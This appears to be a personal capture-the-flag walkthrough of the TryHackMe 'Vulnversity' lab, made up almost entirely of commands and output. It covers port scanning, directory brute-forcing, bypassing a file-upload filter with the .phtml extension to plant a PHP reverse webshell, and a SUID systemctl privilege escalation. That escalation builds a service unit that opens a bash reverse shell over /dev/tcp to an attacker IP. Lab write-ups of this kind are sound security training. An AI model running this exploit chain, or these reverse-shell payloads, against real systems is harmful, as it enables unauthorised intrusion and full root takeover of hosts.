+++
title = "Vulnversity"
+++
# https://tryhackme.com/room/vulnversity

```bash
=================================
10.201.35.210 -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=10.201.35.210' >> ~/.zshrc && source ~/.zshrc

sudo rustscan --no-banner -u $(ulimit -Hn) -b 65535 -t 2000 --scan-order "Random" -r 1-65535 -a $TARGET -- -oA $(date +%Y-%m-%d_%H%M)_rustscan -A

PORT     STATE SERVICE     REASON         VERSION
139/tcp  open  netbios-ssn syn-ack ttl 60 Samba smbd 4
445/tcp  open  netbios-ssn syn-ack ttl 60 Samba smbd 4
3128/tcp open  http-proxy  syn-ack ttl 60 Squid http proxy 4.10
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.10
3333/tcp open  http        syn-ack ttl 60 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Vuln University

sudo masscan -p1-65535 --wait 30 --rate 1000 --banners -oG masscan_ports.txt --interface <INTERFACE> <TARGET>

sudo masscan -p1-65535 --wait 30 --rate 1000 --banners -oG masscan_ports.txt --interface tun0 $TARGET
Timestamp: 1760464019   Host: 10.201.35.210 ()  Ports: 3128/open/tcp//unknown//
Timestamp: 1760464030   Host: 10.201.35.210 ()  Ports: 445/open/tcp//microsoft-ds//
Timestamp: 1760464049   Host: 10.201.35.210 ()  Ports: 3333/open/tcp//unknown//
Timestamp: 1760464050   Host: 10.201.35.210 ()  Ports: 139/open/tcp//netbios-ssn//
Timestamp: 1760464052   Host: 10.201.35.210 ()  Ports: 22/open/tcp//ssh//
Timestamp: 1760464061   Host: 10.201.35.210 ()  Ports: 21/open/tcp//ftp//

MASSCAN_PORTS=$(grep -oP 'Ports: \K[^/]+(?=/open/tcp)' masscan_ports.txt | tr '\n' ',' | sed 's/,$//')

sudo nmap -n -Pn -sS -p $MASSCAN_PORTS -sV -sC -oA nmap_deep.txt $TARGET
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d2:dc:e0:39:78:cc:e9:11:ed:db:ce:52:e1:10:02:49 (RSA)
|   256 10:6f:2b:ad:5c:ae:63:2e:1d:1a:78:68:1e:c0:8f:64 (ECDSA)
|_  256 e2:9a:09:ec:8a:64:5b:d2:ab:62:4b:dd:68:35:aa:c6 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
3128/tcp open  http-proxy  Squid http proxy 4.10
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.10
3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Vuln University
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

gobuster --quiet --threads 64 --output gobuster_dir_common dir --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt --url http://$TARGET:3333
/.hta                 (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/css                  (Status: 301) [Size: 319] [--> http://10.201.35.210:3333/css/]
/fonts                (Status: 301) [Size: 321] [--> http://10.201.35.210:3333/fonts/]
/images               (Status: 301) [Size: 322] [--> http://10.201.35.210:3333/images/]
/index.html           (Status: 200) [Size: 33014]
/internal             (Status: 301) [Size: 324] [--> http://10.201.35.210:3333/internal/]
/js                   (Status: 301) [Size: 318] [--> http://10.201.35.210:3333/js/]
/server-status        (Status: 403) [Size: 280]

feroxbuster -t 64 -o feroxbuster_dir_common --depth 2 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$TARGET:3333

Here are the common and historically possible PHP file extensions in a single code block:

echo '.php
.phtml
.php3
.php4
.php5
.php7
.phps
.phpt
.inc
.phar
.pht
.html
.htm
.php.jpg
.php.gif' > php_exts.txt

# File upload form
http://10.201.35.210:3333/internal/
// captured file upload traffic

Select POST request > CTRL+I (send to intruder) > select in "filename=blah.txt" the file ext > "Add §" > Payload Configuration > Load > php_exts.txt > Start Attack
// check responses for "Success" and not "Extension not allowed"

// phtml is the winner

cp /usr/share/webshells/php/php-reverse-shell.php taco.phtml
// edit

# Find subdirs/exact location where files get uploaded
cat /usr/share/seclists/Discovery/Web-Content/common.txt > combined_finder.txt
echo "taco.phtml" >> combined_finder.txt
feroxbuster --scan-dir-listings --depth 3 -w combined_finder.txt -u http://$TARGET:3333/internal
200      GET        1l        1w        5c http://10.201.35.210:3333/internal/uploads/tst.phtml
200      GET        2l       14w       92c http://10.201.35.210:3333/internal/uploads/taco.phtml

nc -vlnp 54321
curl -o- http://10.201.35.210:3333/internal/uploads/taco.phtml
// success!

for i in python3 python python2; do command -v "$i" >/dev/null && "$i" -c 'import pty; pty.spawn("/bin/bash")' && exit; done
export TERM=xterm

cat /home/bill/user.txt

# priv escs
SUID_IGNORE_LIST="chsh|gpasswd|newgrp|chfn|passwd|sudo|su|ping|ping6|mount|umount|Xorg\.wrap|ssh-keysign"
find / -perm -u=s -type f 2>/dev/null | grep -vE "/(${SUID_IGNORE_LIST})$";
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/systemctl
/bin/fusermount
/snap/snapd/24505/usr/lib/snapd/snap-confine
/snap/core20/2582/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/sbin/mount.cifs

// winner winner chicker dinner
// /bin/systemctl

# https://gtfobins.github.io/gtfobins/systemctl/#suid
nc -lvnp 9001

ATTACKER_IP="10.13.95.101"
ATTACKER_PORT="9001"
TF=$(mktemp).service
echo "[Service]
Type=oneshot
ExecStart=bash -c '/bin/bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1'
[Install]
WantedBy=multi-user.target" > $TF
systemctl link $TF
systemctl enable --now $TF
// root!

cat /root/root.txt
```